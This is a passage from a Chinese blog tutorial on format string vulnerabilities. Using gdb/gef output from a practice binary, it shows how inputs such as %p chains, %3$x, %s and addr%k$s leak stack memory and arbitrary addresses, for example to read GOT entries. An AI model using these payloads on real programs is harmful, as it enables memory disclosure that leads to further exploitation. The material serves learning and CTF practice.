+<p>可以看出，此时已经进入了printf函数中，<strong>栈中的第一个变量为返回地址，第二个变量为格式化字符串的地址，第三个变量为a的值，第四个变量为b的值，第五个变量为c的值，第六个变量为我们输入的格式化字符串对应的地址。</strong>继续运行程序。</p>
+<pre class="line-numbers language-shell"><code class="language-shell">gef➤  c
+Continuing.
+00000001.22222222.ffffffff.%08x.%08x.%08x<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>可以看出，程序确实输出了每一个变量对应的数值，并且断在了下一个printf处</p>
+<pre class="line-numbers language-assembly"><code class="language-assembly">Breakpoint 1, __printf (format=0xffffd008 "%08x.%08x.%08x") at printf.c:28
+28    in printf.c
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd008  →  "%08x.%08x.%08x"
+$ebx   : 0x0       
+$ecx   : 0x7fffffd6
+$edx   : 0xf7fb7870  →  0x00000000
+$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10
+$ebp   : 0xffffd078  →  0x00000000
+$esi   : 0xf7fb6000  →  0x001b1db0
+$edi   : 0xf7fb6000  →  0x001b1db0
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp
+0xffffcfe0│+0x0004: 0xffffd008  →  "%08x.%08x.%08x"
+0xffffcfe4│+0x0008: 0xffffd008  →  "%08x.%08x.%08x"
+0xffffcfe8│+0x000c: 0xf7ffd918  →  0x00000000
+0xffffcfec│+0x0010: 0x00f0b5ff
+0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x00000000
+0xffffcff4│+0x0018: 0x00000001
+0xffffcff8│+0x001c: 0x000000c2
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7e4d66d                  nop    
+   0xf7e4d66e                  xchg   ax, ax
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7e4d670 → __printf(format=0xffffd008 "%08x.%08x.%08x")
+[#1] 0x804852c → main()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>此时，由于格式化字符串为%x%x%x，所以，程序会将栈上的第三个地址开始处(也就是0xffffcfe4)及其以后的数值分别作为第一、第二、第三个参数按照int型进行解析，分别输出。继续运行，我们可以得到如下结果，和想象中一致。</p>
+<pre class="line-numbers language-shell"><code class="language-shell">gef➤  c
+Continuing.
+ffffd008.f7ffd918.00f0b5ff[Inferior 1 (process 4193) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>当然，我们也可以使用%p来获取数据，如下</p>
+<pre><code>gef➤  r
+Starting program: /home/devil/leakmemory 
+%p.%p.%p
+00000001.22222222.ffffffff.%p.%p.%p
+0xffffd008.0xf7ffd918.0xf0b5ff[Inferior 1 (process 4253) exited normally]</code></pre><p>这里需要注意的是，并不是每次得到的结果都一样 ，因为栈上的数据会因为每次分配的内存页不同而有所不同，这是因为栈是不对内存页做初始化的。</p>
+<p><strong>那么有没有办法直接获取栈中被视为第n+1个参数的值呢？</strong></p>
+<p>方法如下：</p>
+<pre><code>%n$x</code></pre><p>利用如上的字符串，我们就可以获取到对应的第 n+1 个参数的数值。为什么这里要说是对应第 n+1 个参数呢？这是因为格式化参数里面的 n 指的是该格式化字符串对应的第 n 个输出参数，那相对于输出函数来说，就是第 n+1 个参数了。</p>
+<p>我们再次以gdb调试一下。</p>
+<pre class="line-numbers language-sh"><code class="language-sh">devil@ubuntu:~$ gdb leakmemory
+gef➤  b printf
+Breakpoint 1 at 0x8048370
+gef➤  r
+Starting program: /home/devil/leakmemory 
+%3$x
+
+Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:28
+28    printf.c: No such file or directory.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd008  →  "%3$x"
+$ebx   : 0x0       
+$ecx   : 0x1       
+$edx   : 0xf7fb787c  →  0x00000000
+$esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20
+$ebp   : 0xffffd078  →  0x00000000
+$esi   : 0xf7fb6000  →  0x001b1db0
+$edi   : 0xf7fb6000  →  0x001b1db0
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffcfcc│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp
+0xffffcfd0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"
+0xffffcfd4│+0x0008: 0x00000001
+0xffffcfd8│+0x000c: 0x22222222
+0xffffcfdc│+0x0010: 0xffffffff
+0xffffcfe0│+0x0014: 0xffffd008  →  "%3$x"
+0xffffcfe4│+0x0018: 0xffffd008  →  "%3$x"
+0xffffcfe8│+0x001c: 0xf7ffd918  →  0x00000000
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7e4d66d                  nop    
+   0xf7e4d66e                  xchg   ax, ax
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")
+[#1] 0x804851d → main()
+
+gef➤  c
+Continuing.
+00000001.22222222.ffffffff.%3$x
+
+Breakpoint 1, __printf (format=0xffffd008 "%3$x") at printf.c:28
+28    in printf.c
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd008  →  "%3$x"
+$ebx   : 0x0       
+$ecx   : 0x7fffffe0
+$edx   : 0xf7fb7870  →  0x00000000
+$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10
+$ebp   : 0xffffd078  →  0x00000000
+$esi   : 0xf7fb6000  →  0x001b1db0
+$edi   : 0xf7fb6000  →  0x001b1db0
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp
+0xffffcfe0│+0x0004: 0xffffd008  →  "%3$x"
+0xffffcfe4│+0x0008: 0xffffd008  →  "%3$x"
+0xffffcfe8│+0x000c: 0xf7ffd918  →  0x00000000
+0xffffcfec│+0x0010: 0x00f0b5ff
+0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x00000000
+0xffffcff4│+0x0018: 0x00000001
+0xffffcff8│+0x001c: 0x000000c2
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7e4d66d                  nop    
+   0xf7e4d66e                  xchg   ax, ax
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7e4d670 → __printf(format=0xffffd008 "%3$x")
+[#1] 0x804852c → main()
+
+gef➤  c
+Continuing.
+f0b5ff[Inferior 1 (process 4290) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>栈上第一个值是返回地址，第二个值是格式化字符串地址，第三个是格式化字符串第一个参数，第四个是格式化字符串第二个参数，第五个是格式化字符串第三个参数，也就是我们要输出的0x00f0b5ff。<strong>注意，格式化字符串的第三个参数是printf函数输出的第四个参数。</strong></p>
+<h5 id="获取栈变量对应字符串"><a href="#获取栈变量对应字符串" class="headerlink" title="获取栈变量对应字符串"></a>获取栈变量对应字符串</h5><p>此外，我们还可以获得栈变量对应的字符串，这其实就是需要用到 %s 了。这里还是使用上面的程序，进行 gdb 调试，如下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemory
+gef➤  b printf
+Breakpoint 1 at 0x8048370
+gef➤  r
+Starting program: /home/devil/leakmemory 
+%s
+
+Breakpoint 1, __printf (format=0x80485d3 "%08x.%08x.%08x.%s\n") at printf.c:28
+28    printf.c: No such file or directory.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd008  →  0x00007325 ("%s"?)
+$ebx   : 0x0       
+$ecx   : 0x1       
+$edx   : 0xf7fb787c  →  0x00000000
+$esp   : 0xffffcfcc  →  0x0804851d  →  <main+98> add esp, 0x20
+$ebp   : 0xffffd078  →  0x00000000
+$esi   : 0xf7fb6000  →  0x001b1db0
+$edi   : 0xf7fb6000  →  0x001b1db0
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry parity ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffcfcc│+0x0000: 0x0804851d  →  <main+98> add esp, 0x20     ← $esp
+0xffffcfd0│+0x0004: 0x080485d3  →  "%08x.%08x.%08x.%s\n"
+0xffffcfd4│+0x0008: 0x00000001
+0xffffcfd8│+0x000c: 0x22222222
+0xffffcfdc│+0x0010: 0xffffffff
+0xffffcfe0│+0x0014: 0xffffd008  →  0x00007325 ("%s"?)
+0xffffcfe4│+0x0018: 0xffffd008  →  0x00007325 ("%s"?)
+0xffffcfe8│+0x001c: 0xf7ffd918  →  0x00000000
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7e4d66d                  nop    
+   0xf7e4d66e                  xchg   ax, ax
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7e4d670 → __printf(format=0x80485d3 "%08x.%08x.%08x.%s\n")
+[#1] 0x804851d → main()
+
+gef➤  c
+Continuing.
+00000001.22222222.ffffffff.%s
+
+Breakpoint 1, __printf (format=0xffffd008 "%s") at printf.c:28
+28    in printf.c
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd008  →  0x00007325 ("%s"?)
+$ebx   : 0x0       
+$ecx   : 0x7fffffe2
+$edx   : 0xf7fb7870  →  0x00000000
+$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10
+$ebp   : 0xffffd078  →  0x00000000
+$esi   : 0xf7fb6000  →  0x001b1db0
+$edi   : 0xf7fb6000  →  0x001b1db0
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp
+0xffffcfe0│+0x0004: 0xffffd008  →  0x00007325 ("%s"?)
+0xffffcfe4│+0x0008: 0xffffd008  →  0x00007325 ("%s"?)
+0xffffcfe8│+0x000c: 0xf7ffd918  →  0x00000000
+0xffffcfec│+0x0010: 0x00f0b5ff
+0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x00000000
+0xffffcff4│+0x0018: 0x00000001
+0xffffcff8│+0x001c: 0x000000c2
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7e4d667 <fprintf+23>     inc    DWORD PTR [ebx+0x66c31cc4]
+   0xf7e4d66d                  nop    
+   0xf7e4d66e                  xchg   ax, ax
+ → 0xf7e4d670 <printf+0>       call   0xf7f23b59 <__x86.get_pc_thunk.ax>
+   ↳  0xf7f23b59 <__x86.get_pc_thunk.ax+0> mov    eax, DWORD PTR [esp]
+      0xf7f23b5c <__x86.get_pc_thunk.ax+3> ret    
+      0xf7f23b5d <__x86.get_pc_thunk.dx+0> mov    edx, DWORD PTR [esp]
+      0xf7f23b60 <__x86.get_pc_thunk.dx+3> ret    
+      0xf7f23b61 <__x86.get_pc_thunk.si+0> mov    esi, DWORD PTR [esp]
+      0xf7f23b64 <__x86.get_pc_thunk.si+3> ret    
+─────────────────────────────────────────────────────── arguments (guessed) ────
+__x86.get_pc_thunk.ax (
+)
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7e4d670 in __printf (), reason: BREAKPOINT
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7e4d670 → __printf(format=0xffffd008 "%s")
+[#1] 0x804852c → main()
+
+gef➤  c
+Continuing.
+%s[Inferior 1 (process 4344) exited normally]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看出，在第二次执行printf函数的时候，确实将0xffffcfe4处的变量视为字符串变量，输出了其数值所对应的地址处的字符串。</p>
+<p><strong>当然，并不是所有这样的都会正常运行，如果对应的变量不能够被解析为字符串地址，那么，程序就会直接崩溃。</strong></p>
+<p>此外，我们也可以指定获取栈上第几个参数作为格式化字符串输出，比如我们指定第 printf 的第 4 个参数，如下，此时程序就不能够解析，就崩溃了。</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ ./leakmemory 
+%3$s
+00000001.22222222.ffffffff.%3$s
+Segmentation fault (core dumped)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>小技巧总结</strong></p>
+<blockquote>
+<ol>
+<li>利用%x来获取对应栈的内存，但建议使用%p，可以不用考虑位数的区别。</li>
+<li>利用%s来获取变量所对应地址的内容，只不过有零截断。</li>
+<li>利用%order$x来获取指定参数的值，利用%order$s来获取指定参数对应地址的内容。</li>
+</ol>
+</blockquote>
+<h4 id="泄露任意地址内存"><a href="#泄露任意地址内存" class="headerlink" title="泄露任意地址内存"></a>泄露任意地址内存</h4><p>可以看出，在上面无论是泄露栈上连续的变量，还是说泄露指定的变量值，我们都没能完全控制我们所要泄露的变量的地址。这样的泄露固然有用，可是却不够强力有效。有时候，我们可能会想要泄露某一个 libc 函数的 got 表内容，从而得到其地址，进而获取 libc 版本以及其他函数的地址，这时候，能够完全控制泄露某个指定地址的内存就显得很重要了。那么我们究竟能不能这样做呢？自然也是可以的啦。</p>
+<p>我们再仔细回想一下，一般来说，在格式化字符串漏洞中，我们所读取的格式化字符串在栈上的(因为是某个函数的局部变量，本例中s是main函数的局部变量)。那么也就是说，在调用输出函数的时候，其实，<strong>第一个参数的值其实就是该格式化字符串的地址。</strong>我们选择上面的某个函数调用为例</p>
+<pre class="line-numbers language-shell"><code class="language-shell">
+Breakpoint 1, __printf (format=0xffffd008 "%s") at printf.c:28
+28    in printf.c
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0xffffd008  →  0x00007325 ("%s"?)
+$ebx   : 0x0       
+$ecx   : 0x7fffffe2
+$edx   : 0xf7fb7870  →  0x00000000
+$esp   : 0xffffcfdc  →  0x0804852c  →  <main+113> add esp, 0x10
+$ebp   : 0xffffd078  →  0x00000000
+$esi   : 0xf7fb6000  →  0x001b1db0
+$edi   : 0xf7fb6000  →  0x001b1db0
+$eip   : 0xf7e4d670  →  <printf+0> call 0xf7f23b59 <__x86.get_pc_thunk.ax>
+$eflags: [carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffcfdc│+0x0000: 0x0804852c  →  <main+113> add esp, 0x10     ← $esp
+0xffffcfe0│+0x0004: 0xffffd008  →  0x00007325 ("%s"?)
+0xffffcfe4│+0x0008: 0xffffd008  →  0x00007325 ("%s"?)
+0xffffcfe8│+0x000c: 0xf7ffd918  →  0x00000000
+0xffffcfec│+0x0010: 0x00f0b5ff
+0xffffcff0│+0x0014: 0xffffd02e  →  0xffff0000  →  0x00000000
+0xffffcff4│+0x0018: 0x00000001
+0xffffcff8│+0x001c: 0x000000c2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看出在栈上的第二个变量就是我们的格式化字符串地址0xffffd008,同时该地址存储的也确实是”%s”格式化字符串内容。</p>
+<p>那么由于我们可以控制该格式化字符串，如果我们知道该格式化字符串在输出函数调用时是第几个参数，这里假设该格式化字符串相对函数调用为第 k 个参数。那我们就可以通过如下的方式来获取某个指定地址 addr 的内容。</p>
+<pre><code>addr%k$s</code></pre><blockquote>
+<p>注：在这里，如果格式化字符串在栈上，那么我们就一定能确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少地域格式化字符串地址8字节或者16字节。</p>
+</blockquote>
+<p>下面就是如何确定该格式化字符串为第几个参数的问题了，我们可以通过如下方式确定</p>
+<pre><code>[tag]%p%p%p%p...</code></pre><p>一般来说，我们会重复某个字符的机器字长来作为tag，而后面会跟上若干个%p来输出栈上的内容，如果内容与我们前面的tag重复了，那么我们就可以有很大把握说明该地址就是格式化字符串的地址，之所以说是有很大把握，这是因为不排除栈上有一些临时变量也是该数值。一般情况下，极其少见，我们也可以更换其它字符进行尝试，进行再次确认。这里我们利用字符’A’作为特定字符，同时还是利用之前编译好的程序，如下</p>
+<pre><code>devil@ubuntu:~$ ./leakmemory 
+AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+00000001.22222222.ffffffff.AAAA%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+AAAA0xff9e92880xf7f959180xf0b5ff0xff9e92ae0x10xc20x10x222222220xffffffff0x414141410x702570250x702570250x702570250x702570250x70257025</code></pre><p>这里0x414141处所在的位置可以看出我们的格式化字符串的起始地址正好是输出函数的第11个参数，也是格式化字符串的第10个参数。(此处和CTF-Wiki上有出入)我们可以来测试一下</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ ./leakmemory 
+%10$s
+00000001.22222222.ffffffff.%10$s
+Segmentation fault (core dumped)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以看出，我们的程序崩溃了，为什么呢？这是因为我们试图将该格式化字符串所对应的值作为地址进行解析，但是显然该值没有办法作为一个合法的地址被解析，所以程序就崩溃了。具体的可以参考下面的调试。</p>
+<pre class="line-numbers language-shell"><code class="language-shell">devil@ubuntu:~$ gdb leakmemory
+gef➤  r
+Starting program: /home/devil/leakmemory 
+%10$s
+00000001.22222222.ffffffff.%10$s
+
+Program received signal SIGSEGV, Segmentation fault.
+__strlen_ia32 () at ../sysdeps/i386/i686/multiarch/../../i586/strlen.S:51
+51    ../sysdeps/i386/i686/multiarch/../../i586/strlen.S: No such file or directory.
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x24303125 ("%10$"?)
+$ebx   : 0x0       
+$ecx   : 0xf7fb6000  →  0x001b1db0
+$edx   : 0x1       
+$esp   : 0xffffc4ec  →  0xf7e45977  →  <printf_positional+7575> add esp, 0x10
+$ebp   : 0xffffca98  →  0xffffcfb8  →  0xffffd078  →  0x00000000
+$esi   : 0xffffc680  →  0xffffffff
+$edi   : 0xf7fb6d60  →  0xfbad2a84
+$eip   : 0xf7e795cf  →  <__strlen_ia32+15> cmp BYTE PTR [eax], dh
+$eflags: [carry parity adjust zero sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
+───────────────────────────────────────────────────────────────────── stack ────
+0xffffc4ec│+0x0000: 0xf7e45977  →  <printf_positional+7575> add esp, 0x10     ← $esp
+0xffffc4f0│+0x0004: "%10$"
+0xffffc4f4│+0x0008: 0x00000000
+0xffffc4f8│+0x000c: 0x00000028 ("("?)
+0xffffc4fc│+0x0010: 0x00000000
+0xffffc500│+0x0014: 0xffffd008  →  "%10$s"
+0xffffc504│+0x0018: 0x00000000
+0xffffc508│+0x001c: 0x00000000
+─────────────────────────────────────────────────────────────── code:x86:32 ────
+   0xf7e795c8 <__strlen_ia32+8> add    BYTE PTR [ecx], ah
+   0xf7e795ca <__strlen_ia32+10> ret    0x2474
+   0xf7e795cd <__strlen_ia32+13> jp     0xf7e795e6 <__strlen_ia32+38>
+ → 0xf7e795cf <__strlen_ia32+15> cmp    BYTE PTR [eax], dh
+   0xf7e795d1 <__strlen_ia32+17> je     0xf7e79676 <__strlen_ia32+182>
+   0xf7e795d7 <__strlen_ia32+23> inc    eax
+   0xf7e795d8 <__strlen_ia32+24> cmp    BYTE PTR [eax], dh
+   0xf7e795da <__strlen_ia32+26> je     0xf7e79676 <__strlen_ia32+182>
+   0xf7e795e0 <__strlen_ia32+32> inc    eax
+─────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "leakmemory", stopped 0xf7e795cf in __strlen_ia32 (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────── trace ────
+[#0] 0xf7e795cf → __strlen_ia32()
+[#1] 0xf7e45977 → printf_positional(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=0xffffd008 "%10$s", readonly_format=0x0, ap=<optimized out>, ap_savep=0xffffcb7c, done=0x0, nspecs_done=0x0, lead_str_end=0xffffd008 "%10$s", work_buffer=0xffffcbb8 "@\001", save_errno=0x0, grouping=0x0, thousands_sep=0xf7f5f7d2 "")
+[#2] 0xf7e46401 → _IO_vfprintf_internal(s=0xf7fb6d60 <_IO_2_1_stdout_>, format=<optimized out>, ap=0xffffcfe4 "\b\320\377\377\030\331\377\367\377\265", <incomplete sequence \360>)
+[#3] 0xf7e4d696 → __printf(format=0xffffd008 "%10$s")
+[#4] 0x804852c → main()
+
+gef➤  help x/
+Examine memory: x/FMT ADDRESS.
+ADDRESS is an expression for the memory address to examine.
+FMT is a repeat count followed by a format letter and a size letter.
+Format letters are o(octal), x(hex), d(decimal), u(unsigned decimal),
+  t(binary), f(float), a(address), i(instruction), c(char), s(string)
+  and z(hex, zero padded on the left).
+Size letters are b(byte), h(halfword), w(word), g(giant, 8 bytes).
+The specified number of objects of the specified size are printed
+according to the format.
+
+Defaults for format and size letters are those previously used.
+Default count is 1.  Default address is following last thing printed
+with this command or "print".
+gef➤  x/x 0xffffd008
+0xffffd008:    0x24303125
+
+gef➤  vmmap
+[ Legend:  Code | Heap | Stack ]
+Start      End        Offset     Perm Path
+0x08048000 0x08049000 0x00000000 r-x /home/devil/leakmemory
+0x08049000 0x0804a000 0x00000000 r-- /home/devil/leakmemory
+0x0804a000 0x0804b000 0x00001000 rw- /home/devil/leakmemory
+0x0804b000 0x0806c000 0x00000000 rw- [heap]
+0xf7e03000 0xf7e04000 0x00000000 rw- 
+0xf7e04000 0xf7fb4000 0x00000000 r-x /lib/i386-linux-gnu/libc-2.23.so
+0xf7fb4000 0xf7fb6000 0x001af000 r-- /lib/i386-linux-gnu/libc-2.23.so
+0xf7fb6000 0xf7fb7000 0x001b1000 rw- /lib/i386-linux-gnu/libc-2.23.so
+0xf7fb7000 0xf7fba000 0x00000000 rw- 
+0xf7fd3000 0xf7fd4000 0x00000000 rw- 
+0xf7fd4000 0xf7fd7000 0x00000000 r-- [vvar]
+0xf7fd7000 0xf7fd9000 0x00000000 r-x [vdso]
